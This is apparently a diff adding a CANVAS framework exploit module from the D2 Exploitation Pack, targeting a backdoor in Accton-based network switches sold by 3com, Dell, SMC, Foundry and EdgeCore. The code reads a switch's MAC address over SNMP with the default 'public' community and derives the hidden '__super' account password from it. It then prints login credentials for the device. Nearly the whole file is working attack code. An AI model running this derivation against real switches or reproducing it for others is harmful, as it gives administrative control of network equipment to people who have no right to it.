@@ -1,0 +1,105 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2010
+#
+
+import sys, time, os
+import subprocess
+import struct
+
+sys.path.append(".")
+sys.path.append("libs")
+
+import canvasengine
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+NAME = "Accton backdoor"
+VERSION = "0.1"
+DESCRIPTION = "Backdoor password in Accton-based switches (3com, Dell, SMC, Foundry and EdgeCore)"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Linux"], ["Windows"] ]
+
+DOCUMENTATION = {}
+DOCUMENTATION["Versions Affected"] = ""
+DOCUMENTATION["Date public"] = "2009/08/15"
+DOCUMENTATION["References"] = "http://www.exploit-db.com/exploits/14875/"
+DOCUMENTATION["CVE Name"] = ""
+DOCUMENTATION["CVE Url"] = ""
+DOCUMENTATION["Notes"] = "You can provide directly a mac address"
+
+class theexploit (tcpexploit):
+    
+  def __init__(self):
+    tcpexploit.__init__(self)
+    self.host = ''
+    self.port = 161
+    self.name = NAME
+    self.snmpver = '1'
+    self.community = 'public'
+    self.oid = '.1.3.6.1.2.1.2.2.1.6.1001'
+    self.macaddr = ''
+	
+  def printchar(self, char):
+    val = ''
+    char = char % 0x4b
+    if (char <= 9 or (char > 0x10 and char < 0x2a) or char > 0x30):
+      val = chr(char+0x30)
+    else:
+      val = '!'
+    return val 
+  
+  def run(self):
+    self.host = self.target.interface
+    self.macaddr = self.argsDict.get('macaddr', self.macaddr)
+    self.setInfo('%s attacking %s' % (NAME,self.host))
+    if not self.macaddr:
+      if sys.platform in ["win32"]:
+        pf = "windows"
+      elif sys.platform in ["linux2"]:
+        pf = "linux"
+      else:
+        self.log('[D2] Platform not supported')
+        self.setInfo('%s attacking %s - failed' % (NAME,self.host))
+        return 1
+      root = os.path.join(os.getcwd(), '3rdparty/D2SEC/exploits/d2sec_accton')
+      cmd  = "\"%s/%s/snmpget.exe\" -v1 -c public %s IF-MIB::ifPhysAddress.1001" % (root, pf, self.host)
+      self.log('[D2] Running %s' % cmd)
+      if sys.platform in ["win32"]:
+        p = Popen("\"%s\"" % cmd, shell=True, bufsize=1024, stdin=PIPE, stdout=PIPE)
+        nfo = p.stdout.read()
+      else:
+        p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        nfo = p.stdout.read()
+      self.macaddr = nfo.split()[3]
+    self.macaddr = self.macaddr.split(':')
+    passwd = ''
+    for i in range(5):
+      char = int(self.macaddr[i], 16)
+      char = char + int(self.macaddr[i+1], 16)
+      passwd += self.printchar(char)
+    for i in range(3):
+      char = int(self.macaddr[i], 16)
+      char = char + int(self.macaddr[i+1], 16)
+      char = char + 0xF
+      passwd += self.printchar(char)   
+    self.log('[D2] Backdoor | Connect as __super with password: %s' % passwd)  
+    self.setInfo('%s attacking %s - done' % (NAME,self.host))
+    return 0
+
+  def usage(self):
+    print 'Usage: %s -t target 0 macaddr:<mac address>' % sys.argv[0]
+    sys.exit(0)
+    
+if __name__ == '__main__':
+  print "Running CANVAS %s v %s" % (NAME,VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
